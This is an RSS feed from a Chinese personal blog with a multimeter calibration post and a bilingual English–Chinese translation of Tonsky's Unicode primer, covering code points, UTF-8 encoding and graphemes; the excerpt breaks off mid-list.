<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>新世界的大门</title><description>因此幻想是世界，谁若懂得，谁就会歌唱</description><link>https://blog.xinshijiededa.men/</link><language>zh-cn</language><item><title>手提式数字多用表 80V DC 点校准的不确定度评定</title><link>https://blog.xinshijiededa.men/calibration-uncertainty/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/calibration-uncertainty/</guid><description>作为常规校准工作的一部分，用多功能校准仪作为工作标准，对手提式数字多用表（DMM）80 V DC 点进行校准，并给出一份校准证书。对被校准的量进行直接测量的校准的过程都大同小异，可以以此作为参考。</description><pubDate>Sat, 13 Apr 2024 23:30:00 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;object data=&amp;quot;https://github.com/OverflowCat/blog/assets/20166026/bfbba98c-c917-401c-8637-2aa1672a198a&amp;quot; type=&amp;quot;image/svg+xml&amp;quot; id=&amp;quot;typst-svg&amp;quot; &amp;gt;&amp;lt;/object&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;style&amp;gt;
#typst-svg {
margin: 0 auto;
display: block;
min-width: 450px;
width: min(900px, 100%);
/* width=&amp;quot;499px&amp;quot; height=&amp;quot;2900px&amp;quot; */
aspect-ratio: 499 / 2900;
}
&amp;lt;/style&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>2023 年每个软件开发者都必须知道的关于 Unicode 的基本知识</title><link>https://blog.xinshijiededa.men/unicode/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/unicode/</guid><description>仍然不准找借口！</description><pubDate>Mon, 30 Oct 2023 00:15:00 GMT</pubDate><content:encoded>&lt;p&gt;import Plane from &amp;quot;./_plane.astro&amp;quot;;
import Loud from &amp;quot;./_loud.astro&amp;quot;;
import Code from &apos;./_code.astro&apos;;
import &amp;quot;@/styles/prism/modern-make-yellow.css&amp;quot;;
import Img from &amp;quot;./_img.astro&amp;quot;;
import { Icon } from &amp;quot;astro-icon/components&amp;quot;;
import &amp;quot;@/styles/icon.less&amp;quot;;
import &amp;quot;@/styles/tonsky-fig-new.less&amp;quot;;
import Uniq from &amp;quot;@/components/Uniq.astro&amp;quot;;&lt;/p&gt;
&lt;p&gt;&amp;lt;Uniq tag=&amp;quot;h1&amp;quot; text={frontmatter.title} /&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;div style=&amp;quot;font-size: 140%; text-align: left; font-weight: 600;&amp;quot;&amp;gt;
The Absolute Minimum Every Software Developer Must Know About Unicode in 2023 (Still No Excuses!)
&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;address style=&amp;quot;text-align: right; margin-bottom: .7em;&amp;quot;&amp;gt;
作者：&amp;lt;a href=&amp;quot;https://tonsky.me/&amp;quot; rel=&amp;quot;author&amp;quot;&amp;gt;&amp;lt;strong&amp;gt;Nikita&amp;lt;/strong&amp;gt;&amp;lt;/a&amp;gt; (@tonsky)
&amp;lt;/address&amp;gt;&lt;/p&gt;
&lt;p&gt;Twenty years ago, &lt;a href=&quot;https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/&quot;&gt;Joel Spolsky wrote&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;二十年前，&lt;a href=&quot;https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/&quot;&gt;Joel Spolsky 写道&lt;/a&gt;[^2003]：&lt;/p&gt;
&lt;p&gt;[^2003]: 这篇 2003 年的文章的中文翻译：&lt;a href=&quot;https://xandersu.com/posts/%E8%AF%91-%E6%AF%8F%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E9%83%BD%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84Unicode%E5%92%8C%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9A%84%E7%BB%9D%E5%AF%B9%E6%9C%80%E4%BD%8E%E8%A6%81%E6%B1%82-%E4%B8%8D%E8%83%BD%E6%9C%89%E4%BB%BB%E4%BD%95%E5%80%9F%E5%8F%A3/&quot;&gt;每一个软件开发者都必须了解的关于 Unicode 和字符集的基本知识（没有任何借口！）&lt;/a&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There Ain’t No Such Thing As Plain Text.&lt;/p&gt;
&lt;p&gt;It does not make sense to have a string without knowing what encoding it uses. You can no longer stick your head in the sand and pretend that “plain” text is ASCII.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;没有所谓的纯文本。&lt;/p&gt;
&lt;p&gt;不知道编码的字符串是没有意义的。你不能像鸵鸟一样再把头埋在沙子里，假装「纯」文本是 ASCII。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A lot has changed in 20 years. In 2003, the main question was: what encoding is this?&lt;/p&gt;
&lt;p&gt;20 年过去了，很多事情都变了。2003 年的时候，主要的问题是：文本用的是什么编码的？&lt;/p&gt;
&lt;p&gt;In 2023, it’s no longer a question: with a 98% probability, it’s UTF-8. Finally! We can stick our heads in the sand again!&lt;/p&gt;
&lt;p&gt;到了 2023 年，这不再是一个问题：有 98% 的概率是 UTF-8。终于！我们可以再次把头埋在沙子里了！&lt;/p&gt;
&lt;p&gt;&amp;lt;Img src=&amp;quot;utf8_trend@2x.png&amp;quot; width={1024} height={452} /&amp;gt;&lt;/p&gt;
&lt;p&gt;The question now becomes: how do we use UTF-8 correctly? Let’s see!&lt;/p&gt;
&lt;p&gt;现在的问题是：我们如何正确地使用 UTF-8？让我们来看看！&lt;/p&gt;
&lt;h2&gt;What is Unicode?&lt;/h2&gt;
&lt;h2&gt;什么是 Unicode？&lt;/h2&gt;
&lt;p&gt;Unicode is a standard that aims to unify all human languages, both past and present, and make them work with computers.&lt;/p&gt;
&lt;p&gt;Unicode 是一种旨在统一过去和现在的所有人类语言，使其能够在计算机上使用的标准。&lt;/p&gt;
&lt;p&gt;In practice, Unicode is a table that assigns unique numbers to different characters.&lt;/p&gt;
&lt;p&gt;在实践中，Unicode 是一个将不同字符分配给唯一编号的表格。&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Latin letter &lt;code&gt;A&lt;/code&gt; is assigned the number &lt;code&gt;65&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;拉丁字母 &lt;code&gt;A&lt;/code&gt; 被分配了数字 &lt;code&gt;65&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;The Arabic Letter Seen &lt;code&gt;س&lt;/code&gt; is &lt;code&gt;1587&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;阿拉伯字母 Seen &lt;code&gt;س&lt;/code&gt; 是 &lt;code&gt;1587&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;The Katakana Letter Tu &lt;code&gt;ツ&lt;/code&gt; is &lt;code&gt;12484&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;片假名字母 Tu &lt;code&gt;ツ&lt;/code&gt; 是 &lt;code&gt;12484&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The Musical Symbol G Clef &lt;code&gt;𝄞&lt;/code&gt; is &lt;code&gt;119070&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;音乐记号中的高音谱号（G 谱号）&lt;code&gt;𝄞&lt;/code&gt; 是 &lt;code&gt;119070&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;💩&amp;lt;/code&amp;gt; is &lt;code&gt;128169&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;💩&amp;lt;/code&amp;gt; 是 &lt;code&gt;128169&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Unicode refers to these numbers as &lt;em&gt;code points&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Unicode 将这些数字称为&lt;em&gt;码位&lt;/em&gt;（code points）。&lt;/p&gt;
&lt;p&gt;Since everybody in the world agrees on which numbers correspond to which characters, and we all agree to use Unicode, we can read each other’s texts.&lt;/p&gt;
&lt;p&gt;由于世界上的每个人都同意哪些数字对应哪些字符，并且我们都同意使用 Unicode，我们就可以阅读彼此的文本。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud en=&amp;quot;Unicode == character ⟷ code point.&amp;quot;&amp;gt;Unicode == 字符 ⟷ 码位。&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;h2&gt;How big is Unicode?&lt;/h2&gt;
&lt;h2&gt;Unicode 有多大？&lt;/h2&gt;
&lt;p&gt;Currently, the largest defined code point is 0x10FFFF. That gives us a space of about 1.1 million code points.&lt;/p&gt;
&lt;p&gt;目前，已被定义的最大码位是 0x10FFFF。这给了我们大约 110 万个码位的空间。&lt;/p&gt;
&lt;p&gt;About 170,000, or 15%, are currently defined. An additional 11% are reserved for private use. The rest, about 800,000 code points, are not allocated at the moment. They could become characters in the future.&lt;/p&gt;
&lt;p&gt;目前已定义了大约 17 万个码位，占 15%。另外 11% 用于私有使用。其余的大约 80 万个码位目前没有分配。它们可能在未来变成字符。&lt;/p&gt;
&lt;p&gt;Here’s roughly how it looks:&lt;/p&gt;
&lt;p&gt;这里是大致的样子：&lt;/p&gt;
&lt;p&gt;&amp;lt;Img src=&amp;quot;https://tonsky.me/blog/unicode/overview@2x.png&amp;quot; width={835} height={735} /&amp;gt;&lt;/p&gt;
&lt;p&gt;Large square == plane == 65,536 characters. Small one == 256 characters. The entire ASCII is half of a small red square in the top left corner.&lt;/p&gt;
&lt;p&gt;大方框 == 平面 == 65,536 个字符。小方框 == 256 个字符。整个 ASCII 是左上角小红色方块的一半。&lt;/p&gt;
&lt;h2&gt;What’s Private Use?&lt;/h2&gt;
&lt;h2&gt;什么是私用区？&lt;/h2&gt;
&lt;p&gt;These are code points reserved for app developers and will never be defined by Unicode itself.&lt;/p&gt;
&lt;p&gt;这些码位是为应用程序开发人员保留的，Unicode 自己永远不会定义它们。&lt;/p&gt;
&lt;p&gt;For example, there’s no place for the Apple logo in Unicode, so Apple puts it at &lt;code&gt;U+F8FF&lt;/code&gt; which is within the Private Use block. In any other font, it’ll render as missing glyph &lt;code&gt;􀣺&lt;/code&gt;, but in fonts that ship with macOS, you’ll see &amp;lt;Icon name=&amp;quot;ic:baseline-apple&amp;quot; height=&amp;quot;17px&amp;quot; /&amp;gt;.&lt;/p&gt;
&lt;p&gt;例如，Unicode 中没有苹果 logo 的位置，因此 Apple 将其放在私用区块中的 &lt;code&gt;U+F8FF&lt;/code&gt;。在任何其他字体中，它都将呈现为缺失的字形 &lt;code&gt;􀣺&lt;/code&gt;，但在 macOS 附带的字体中，你就可以看到 &amp;lt;Icon name=&amp;quot;ic:baseline-apple&amp;quot; height=&amp;quot;17px&amp;quot; /&amp;gt;。&lt;/p&gt;
&lt;p&gt;The Private Use Area is mostly used by icon fonts:&lt;/p&gt;
&lt;p&gt;私用区主要由图标字体使用：&lt;/p&gt;
&lt;p&gt;&amp;lt;Img src=&amp;quot;https://tonsky.me/blog/unicode/nerd_font@2x.png&amp;quot;
width=&amp;quot;584&amp;quot;
height=&amp;quot;268&amp;quot;
encap=&amp;quot;Isn’t it a beauty? It’s all text!&amp;quot;
zhcap=&amp;quot;是不是很漂亮？都是文本哦！&amp;quot;
/&amp;gt;&lt;/p&gt;
&lt;h2&gt;What does &lt;code&gt;U+1F4A9&lt;/code&gt; mean?&lt;/h2&gt;
&lt;h2&gt;&lt;code&gt;U+1F4A9&lt;/code&gt; 是什么意思？&lt;/h2&gt;
&lt;p&gt;It’s a convention for how to write code point values. The prefix &lt;code&gt;U+&lt;/code&gt; means, well, Unicode, and &lt;code&gt;1F4A9&lt;/code&gt; is a code point number in hexadecimal.&lt;/p&gt;
&lt;p&gt;这是一种码位值写法的约定。前缀 &lt;code&gt;U+&lt;/code&gt; 表示 Unicode，&lt;code&gt;1F4A9&lt;/code&gt; 是十六进制中的码位数字。&lt;/p&gt;
&lt;p&gt;Oh, and &lt;code&gt;U+1F4A9&lt;/code&gt; specifically is &amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;💩&amp;lt;/code&amp;gt;.&lt;/p&gt;
&lt;p&gt;噢，&lt;code&gt;U+1F4A9&lt;/code&gt; 具体是 &amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;💩&amp;lt;/code&amp;gt;。&lt;/p&gt;
&lt;h2&gt;What’s UTF-8 then?&lt;/h2&gt;
&lt;h2&gt;那 UTF-8 是什么？&lt;/h2&gt;
&lt;p&gt;UTF-8 is an encoding. Encoding is how we store code points in memory.&lt;/p&gt;
&lt;p&gt;UTF-8 是一种编码。编码是我们在内存中存储码位的方式。&lt;/p&gt;
&lt;p&gt;The simplest possible encoding for Unicode is UTF-32. It simply stores code points as 32-bit integers. So &lt;code&gt;U+1F4A9&lt;/code&gt; becomes &lt;code&gt;00 01 F4 A9&lt;/code&gt;, taking up four bytes. Any other code point in UTF-32 will also occupy four bytes. Since the highest defined code point is &lt;code&gt;U+10FFFF&lt;/code&gt;, any code point is guaranteed to fit.&lt;/p&gt;
&lt;p&gt;Unicode 最简单的编码是 UTF-32。它只是将码位存储为 32 位整数。因此，&lt;code&gt;U+1F4A9&lt;/code&gt; 变为 &lt;code&gt;00 01 F4 A9&lt;/code&gt;，占用四个字节。UTF-32 中的任何其他码位也将占用四个字节。由于最高定义的码位是 &lt;code&gt;U+10FFFF&lt;/code&gt;，因此可以保证任何码位都适合。&lt;/p&gt;
&lt;p&gt;UTF-16 and UTF-8 are less straightforward, but the ultimate goal is the same: to take a code point and encode it as bytes.&lt;/p&gt;
&lt;p&gt;UTF-16 和 UTF-8 不那么直接，但最终目标是相同的：将码位作为字节进行编码。&lt;/p&gt;
&lt;p&gt;Encoding is what you’ll actually deal with as a programmer.&lt;/p&gt;
&lt;p&gt;作为程序员，编码是你实际处理的内容。&lt;/p&gt;
&lt;h2&gt;How many bytes are in UTF-8?&lt;/h2&gt;
&lt;h2&gt;UTF-8 中有多少字节？&lt;/h2&gt;
&lt;p&gt;UTF-8 is a variable-length encoding. A code point might be encoded as a sequence of one to four bytes.&lt;/p&gt;
&lt;p&gt;UTF-8 是一种变长编码。码位可能被编码为一个到四个字节的序列。&lt;/p&gt;
&lt;p&gt;This is how it works:&lt;/p&gt;
&lt;p&gt;这是它工作的方式：&lt;/p&gt;
&lt;p&gt;&amp;lt;table&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;th&amp;gt;Code point&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;Byte 1&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;Byte 2&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;Byte 3&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;Byte 4&amp;lt;/th&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/thead&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;th&amp;gt;码位&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;第 1 字节&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;第 2 字节&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;第 3 字节&amp;lt;/th&amp;gt;
&amp;lt;th&amp;gt;第 4 字节&amp;lt;/th&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/thead&amp;gt;
&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;
U+&amp;lt;code&amp;gt;0000&amp;lt;/code&amp;gt;..&amp;lt;code&amp;gt;007F&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;0xxxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;
U+&amp;lt;code&amp;gt;0080&amp;lt;/code&amp;gt;..&amp;lt;code&amp;gt;07FF&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;110xxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;10xxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;
U+&amp;lt;code&amp;gt;0800&amp;lt;/code&amp;gt;..&amp;lt;code&amp;gt;FFFF&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;1110xxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;10xxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;10xxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;
&amp;lt;td&amp;gt;
U+&amp;lt;code&amp;gt;10000&amp;lt;/code&amp;gt;..&amp;lt;code&amp;gt;10FFFF&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;11110xxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;10xxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;10xxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;td&amp;gt;
&amp;lt;code&amp;gt;10xxxxxx&amp;lt;/code&amp;gt;
&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;&lt;/p&gt;
&lt;p&gt;If you combine this with the Unicode table, you’ll see that English is encoded with 1 byte, Cyrillic, Latin European languages, Hebrew and Arabic need 2, and Chinese, Japanese, Korean, other Asian languages, and Emoji need 3 or 4.&lt;/p&gt;
&lt;p&gt;将此与 Unicode 表结合起来，就可以看到英语使用 1 个字节进行编码，西里尔语、拉丁语、希伯来语和阿拉伯语需要 2 个字节，中文、日文、韩文、其他亚洲语言和 Emoji 需要 3 个或 4 个字节。&lt;/p&gt;
&lt;p&gt;A few important points here:&lt;/p&gt;
&lt;p&gt;这里有几个要点：&lt;/p&gt;
&lt;p&gt;First, UTF-8 is byte-compatible with ASCII. The code points 0..127, the former ASCII, are encoded with one byte, and it’s the same exact byte. &lt;code&gt;U+0041&lt;/code&gt; (&lt;code&gt;A&lt;/code&gt;, Latin Capital Letter A) is just &lt;code&gt;41&lt;/code&gt;, one byte.&lt;/p&gt;
&lt;p&gt;第一，UTF-8 与 ASCII 兼容。码位 0..127，即 ASCII，使用一个字节进行编码，而且是完全相同的字节。&lt;code&gt;U+0041&lt;/code&gt; (&lt;code&gt;A&lt;/code&gt;，拉丁大写字母 A) 只是 &lt;code&gt;41&lt;/code&gt;，一个字节。&lt;/p&gt;
&lt;p&gt;Any pure ASCII text is also a valid UTF-8 text, and any UTF-8 text that only uses codepoints 0..127 can be read as ASCII directly.&lt;/p&gt;
&lt;p&gt;任何纯 ASCII 文本也是有效的 UTF-8 文本，任何只使用码位 0..127 的 UTF-8 文本都可以直接读取为 ASCII。&lt;/p&gt;
&lt;p&gt;Second, UTF-8 is space-efficient for basic Latin. That was one of its main selling points over UTF-16. It might not be fair for texts all over the world, but for technical strings like HTML tags or JSON keys, it makes sense.&lt;/p&gt;
&lt;p&gt;第二，UTF-8 对于基本拉丁语来说可以节省空间。这是它比 UTF-16 的主要卖点之一。对于世界各地的文本来说可能不公平，但对于 HTML 标签或 JSON 键等技术字符串来说是有意义的。&lt;/p&gt;
&lt;p&gt;On average, UTF-8 tends to be a pretty good deal, even for non-English computers. And for English, there’s no comparison.&lt;/p&gt;
&lt;p&gt;平均而言，UTF-8 往往是一个相当不错的选择，即使对于使用非英语的计算机也是如此。而对于英语而言，没有比它更好的选择了。&lt;/p&gt;
&lt;p&gt;Third, UTF-8 has error detection and recovery built-in. The first byte’s prefix always looks different from bytes 2-4. This way you can always tell if you are looking at a complete and valid sequence of UTF-8 bytes or if something is missing (for example, you jumped it the middle of the sequence).
Then you can correct that by moving forward or backward until you find the beginning of the correct sequence.&lt;/p&gt;
&lt;p&gt;第三，UTF-8 自带错误检测和错误恢复的功能。第一个字节的前缀总是与第 2-4 个字节不同，因而你总是可以判断你是否正在查看完整且有效的 UTF-8 字节序列，或者是否缺少某些内容（例如，你跳到了序列的中间）。然后你就可以通过向前或向后移动，直到找到正确序列的开头来纠正它。&lt;/p&gt;
&lt;p&gt;And a couple of important consequences:&lt;/p&gt;
&lt;p&gt;这带来了一些重要的结论：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You CAN’T determine the length of the string by counting bytes.&lt;/li&gt;
&lt;li&gt;你&lt;strong&gt;不能&lt;/strong&gt;通过计数字节来确定字符串的长度。&lt;/li&gt;
&lt;li&gt;You CAN’T randomly jump into the middle of the string and start reading.&lt;/li&gt;
&lt;li&gt;你&lt;strong&gt;不能&lt;/strong&gt;随机跳到字符串的中间并开始读取。&lt;/li&gt;
&lt;li&gt;You CAN’T get a substring by cutting at arbitrary byte offsets. You might cut off part of the character.&lt;/li&gt;
&lt;li&gt;你&lt;strong&gt;不能&lt;/strong&gt;通过在任意字节偏移处切割来获取子字符串。你可能会切掉字符的一部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those who do will eventually meet this bad boy: �&lt;/p&gt;
&lt;p&gt;试图这样做的人最终会遇到这个坏小子：�&lt;/p&gt;
&lt;h2&gt;What’s �?&lt;/h2&gt;
&lt;h2&gt;� 是什么？&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;U+FFFD&lt;/code&gt;, the Replacement Character, is simply another code point in the Unicode table. Apps and libraries can use it when they detect Unicode errors.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;U+FFFD&lt;/code&gt;，&amp;lt;dfn&amp;gt;替换字符&amp;lt;/dfn&amp;gt;，只是 Unicode 表中的另一个码位。当应用程序和库检测到 Unicode 错误时，它们可以使用它。&lt;/p&gt;
&lt;p&gt;If you cut half of the code point off, there’s not much left to do with the other half, except displaying an error. That’s when � is used.&lt;/p&gt;
&lt;p&gt;如果你切掉了码位的一半，那就没有什么其他办法，只能显示错误了。这就是使用 � 的时候。&lt;/p&gt;
&lt;p&gt;&amp;lt;Code
lang=&amp;quot;js&amp;quot;
code={&lt;code&gt;var bytes = &amp;quot;Аналитика&amp;quot;.getBytes(&amp;quot;UTF-8&amp;quot;); var partial = Arrays.copyOfRange(bytes, 0, 11); new String(partial, &amp;quot;UTF-8&amp;quot;); // =&amp;gt; &amp;quot;Анал�&amp;quot;&lt;/code&gt;}
/&amp;gt;&lt;/p&gt;
&lt;h2&gt;Wouldn’t UTF-32 be easier for everything?&lt;/h2&gt;
&lt;h2&gt;使用 UTF-32 不会让一切变得更容易吗？&lt;/h2&gt;
&lt;p&gt;NO.&lt;/p&gt;
&lt;p&gt;不会。&lt;/p&gt;
&lt;p&gt;UTF-32 is great for operating on code points. Indeed, if every code point is always 4 bytes, then &lt;code&gt;strlen(s) == sizeof(s) / 4&lt;/code&gt;, &lt;code&gt;substring(0, 3) == bytes[0, 12]&lt;/code&gt;, etc.&lt;/p&gt;
&lt;p&gt;UTF-32 对于操作码位很棒。确实，如果每个码位总是 4 个字节，那么 &lt;code&gt;strlen(s) == sizeof(s) / 4&lt;/code&gt;，&lt;code&gt;substring(0, 3) == bytes[0, 12]&lt;/code&gt;，等等。&lt;/p&gt;
&lt;p&gt;The problem is, you don’t want to operate on code points. A code point is not a unit of writing; one code point is not always a single character. What you should be iterating on is called “&lt;strong&gt;extended grapheme clusters&lt;/strong&gt;”, or graphemes for short.&lt;/p&gt;
&lt;p&gt;问题是，你想操作的并非码位。码位不是书写的单位；一个码位不总是一个字符。你应该迭代的是叫做「&lt;strong&gt;&amp;lt;dfn&amp;gt;扩展字位簇&amp;lt;/dfn&amp;gt;&lt;/strong&gt;（extended grapheme cluster）」的东西，我们在这里简称字位。&lt;/p&gt;
&lt;p&gt;A grapheme is a minimally distinctive unit of writing in the context of a particular writing system. &lt;code&gt;ö&lt;/code&gt; is one grapheme. &lt;code&gt;é&lt;/code&gt; is one too. And &lt;code&gt;각&lt;/code&gt;. Basically, grapheme is what the user thinks of as a single character.&lt;/p&gt;
&lt;p&gt;&amp;lt;dfn&amp;gt;字位&amp;lt;/dfn&amp;gt;（grapheme，或译作字素）&lt;a href=&quot;%5B%3Cdfn%3E%E5%AD%97%E4%BD%8D%3C/dfn%3E%5D(https://zh.wikipedia.org/wiki/%E5%AD%97%E4%BD%8D)%E5%8F%88%E7%A7%B0%E5%BD%A2%E7%B4%A0%E3%80%81%E5%AD%97%E7%B4%A0%EF%BC%8C%E6%98%AF%E6%9C%80%E5%B0%8F%E7%9A%84%E6%9C%89%E6%84%8F%E4%B9%89%E4%B9%A6%E5%86%99%E7%AC%A6%E5%8F%B7%E5%8D%95%E4%BD%8D%EF%BC%9B%E6%AD%A4%E6%9C%AF%E8%AF%AD%E6%98%AF%E7%94%B1%E8%AF%AD%E9%9F%B3%E5%AD%A6%E9%87%8C%E7%9A%84%E3%80%8C%E9%9F%B3%E4%BD%8D%EF%BC%88%E9%9F%B3%E7%B4%A0%EF%BC%89%E3%80%8D%E7%B1%BB%E6%8E%A8%E5%88%B0%E6%96%87%E5%AD%97%E5%AD%A6%E7%9A%84%E3%80%82&quot;&gt;^1&lt;/a&gt;是在特定书写系统的上下文中最小的可区分的书写单位。&lt;code&gt;ö&lt;/code&gt; 是一个字位。&lt;code&gt;é&lt;/code&gt;、&lt;code&gt;각&lt;/code&gt; 也是。基本上，字位是用户认为是单个字符的东西。&lt;/p&gt;
&lt;p&gt;The problem is, in Unicode, some graphemes are encoded with multiple code points!&lt;/p&gt;
&lt;p&gt;问题是，在 Unicode 中，一些字位使用多个码位进行编码！&lt;/p&gt;
&lt;p&gt;&amp;lt;Img src=&amp;quot;graphemes@2x.png&amp;quot; width=&amp;quot;600&amp;quot; height=&amp;quot;340&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;For example, &lt;code&gt;é&lt;/code&gt; (a single grapheme) is encoded in Unicode as &lt;code&gt;e&lt;/code&gt; (U+0065 Latin Small Letter E) + &lt;code&gt;´&lt;/code&gt; (U+0301 Combining Acute Accent). Two code points!&lt;/p&gt;
&lt;p&gt;比如说，&lt;code&gt;é&lt;/code&gt;（一个单独的字位）在 Unicode 中被编码为 &lt;code&gt;e&lt;/code&gt;（U+0065 拉丁小写字母 E）+ &lt;code&gt;´&lt;/code&gt;（U+0301 连接重音符）。两个码位！&lt;/p&gt;
&lt;p&gt;It can also be more than two:&lt;/p&gt;
&lt;p&gt;它也可以是两个以上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;☹️&amp;lt;/code&amp;gt; is &lt;code&gt;U+2639&lt;/code&gt; + &lt;code&gt;U+FE0F&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;☹️&amp;lt;/code&amp;gt; 是 &lt;code&gt;U+2639&lt;/code&gt; + &lt;code&gt;U+FE0F&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;👨‍🏭&amp;lt;/code&amp;gt; is &lt;code&gt;U+1F468&lt;/code&gt; + &lt;code&gt;U+200D&lt;/code&gt; + &lt;code&gt;U+1F3ED&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;👨‍🏭&amp;lt;/code&amp;gt; 是 &lt;code&gt;U+1F468&lt;/code&gt; + &lt;code&gt;U+200D&lt;/code&gt; + &lt;code&gt;U+1F3ED&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🚵🏻‍♀️&amp;lt;/code&amp;gt; is &lt;code&gt;U+1F6B5&lt;/code&gt; + &lt;code&gt;U+1F3FB&lt;/code&gt; + &lt;code&gt;U+200D&lt;/code&gt; + &lt;code&gt;U+2640&lt;/code&gt; + &lt;code&gt;U+FE0F&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;code class=&amp;quot;emoji&amp;quot;&amp;gt;🚵🏻‍♀️&amp;lt;/code&amp;gt; 是 &lt;code&gt;U+1F6B5&lt;/code&gt; + &lt;code&gt;U+1F3FB&lt;/code&gt; + &lt;code&gt;U+200D&lt;/code&gt; + &lt;code&gt;U+2640&lt;/code&gt; + &lt;code&gt;U+FE0F&lt;/code&gt;&lt;/li&gt;
